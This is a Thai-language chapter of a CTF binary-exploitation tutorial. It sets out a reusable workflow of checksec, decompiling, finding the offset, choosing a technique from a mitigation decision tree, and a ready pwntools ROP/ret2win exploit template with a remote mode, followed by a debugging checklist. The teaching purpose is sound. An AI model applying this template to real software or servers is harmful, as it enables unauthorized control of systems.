# บท 11 — Workflow มาตรฐาน (ใช้ซ้ำได้ทุกโจทย์)

บทนี้คือ "แผนที่ในหัว" ที่ทำให้คุณไม่ตันเวลาเจอโจทย์ใหม่ ทำตามขั้นตอนนี้
ทุกครั้ง แล้วโจทย์ intro–medium ส่วนใหญ่จะแก้ได้

---

## 5 ขั้นตอนหลัก

```
1. checksec        → เกมนี้เล่นยังไง?
2. decompile       → ช่องโหว่อยู่ตรงไหน?
3. หา offset       → คุม RIP ที่ระยะเท่าไหร่?
4. เลือกเทคนิค     → mitigation บอกว่าต้องใช้อะไร
5. เขียน exploit   → หยิบ template มาปรับ
```

---

## ขั้นที่ 1: [checksec](05-tools.md#1-checksec--ด่านแรกเสมอ) — สำรวจสนาม

```bash
pwn checksec ./vuln
```

จดไว้: **Canary? NX? PIE? RELRO?** — 4 ตัวนี้กำหนดทุกอย่าง

---

## ขั้นที่ 2: decompile — หาช่องโหว่

เปิด Ghidra (หรือ objdump) ดู `main` และฟังก์ชันที่รับ input มองหา:

```c
gets(buf)              → overflow
read(0, buf, ใหญ่ๆ)    → overflow
scanf("%s", buf)       → overflow
strcpy(dst, src)       → overflow ถ้า src ยาว
printf(user_input)     → format string
```

พร้อมกันนั้นมองหา **ของแถม**:
- มีฟังก์ชัน `win` / `flag` / `system` ไหม? → ret2win ได้เลย
- มี string `"/bin/sh"` ไหม?
- มี `system()` ใน binary ไหม?

---

## ขั้นที่ 3: หา offset

```bash
pwndbg> cyclic 200
pwndbg> run          # paste เข้าไป
# crash แล้ว:
pwndbg> cyclic -l <ค่าที่เจอใน RSP/RIP>
```

---

## ขั้นที่ 4: เลือกเทคนิค (ต้นไม้ตัดสินใจ)

```
มีฟังก์ชัน win/flag ในโค้ดไหม?
├─ มี  → ret2win (บท 6)
│        └─ win ต้อง arg? → เพิ่ม pop rdi; ret
│
└─ ไม่มี → ต้องเรียก system เอง
          │
          ├─ มี system() + "/bin/sh" ในไฟล์? → ret2plt system
          │
          └─ ไม่มี → ret2libc (บท 7)
                    └─ leak libc → คำนวณ base → system("/bin/sh")

ช่องโหว่เป็น format string?
└─ ใช้ leak (canary/libc) และ/หรือ GOT overwrite (บท 9-10)

NX เปิด และต้อง chain หลาย call?
└─ ROP chain (บท 8)

Canary เปิด?
└─ ต้อง leak canary ก่อน (format string หรือ partial overwrite)
   แล้วใส่ canary กลับใน payload ตำแหน่งเดิม

PIE เปิด?
└─ ต้อง leak address ของโค้ดก่อน แล้วบวก offset
```

### ตารางสรุป mitigation → เทคนิค

| เจอ | ต้องทำก่อน | เทคนิคที่ใช้ |
|-----|-----------|-------------|
| No canary, No PIE, มี win | - | ret2win |
| No canary, NX, ไม่มี win | - | ret2libc / ROP |
| Canary | leak canary | ret2win/libc + ใส่ canary กลับ |
| PIE | leak code address | บวก offset ทุก address |
| ASLR (libc) | leak libc address | คำนวณ libc base |
| format string | หา offset input | leak + GOT overwrite |

---

## ขั้นที่ 5: เขียน exploit (template พร้อมใช้)

```python
#!/usr/bin/env python3
from pwn import *

# ===== setup =====
context.binary = elf = ELF('./vuln')
# libc = ELF('./libc.so.6')          # ถ้ามี
# context.log_level = 'debug'         # เปิดตอน debug

def conn():
    if args.REMOTE:
        return remote('host', 1337)
    elif args.GDB:
        return gdb.debug('./vuln', 'break vuln\ncontinue')
    else:
        return process('./vuln')

p = conn()

# ===== หา offset (ทำครั้งเดียวแล้ว hardcode) =====
offset = 72

# ===== exploit =====
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * offset,
    p64(ret),                       # align
    p64(pop_rdi), p64(0),           # ← ปรับตามเทคนิค
    p64(elf.symbols['win']),        # ← ปรับตามเทคนิค
)

p.sendlineafter(b'> ', payload)
p.interactive()
```

รันแบบต่างๆ:

```bash
python3 exploit.py            # local
python3 exploit.py GDB        # เปิด GDB debug
python3 exploit.py REMOTE     # ยิง server จริง
```

---

## เมื่อ exploit ไม่ทำงาน — checklist debug

1. ☐ ตั้ง `context.binary` แล้วยัง? (กัน p64 ผิด arch)
2. ☐ offset ถูกไหม? ลอง `cyclic` ใหม่
3. ☐ crash ที่ `movaps`? → เพิ่ม `ret` align
4. ☐ leak อ่านถูกไหม? print ออกมาดูด้วย `hex()`
5. ☐ pad ไบต์ครบ 8 ไหม? `.ljust(8, b'\x00')`
6. ☐ ส่ง payload ถูก prompt ไหม? เช็คด้วย `log_level='debug'`
7. ☐ local ผ่านแต่ remote ไม่ผ่าน? → libc คนละเวอร์ชัน
8. ☐ ใช้ `gdb.debug()` step ดูว่า RIP ไปถูกทางไหม

---

## สรุปบทนี้

- ทำ 5 ขั้นทุกโจทย์: [checksec](05-tools.md#1-checksec--ด่านแรกเสมอ) → decompile → offset → เลือกเทคนิค → เขียน
- ให้ **mitigation เป็นตัวชี้ทาง** ว่าต้องใช้เทคนิคไหน
- มี template กลางที่ปรับได้ทุกโจทย์
- มี checklist debug เวลาติด

บทสุดท้าย: ไปต่อทางไหน →
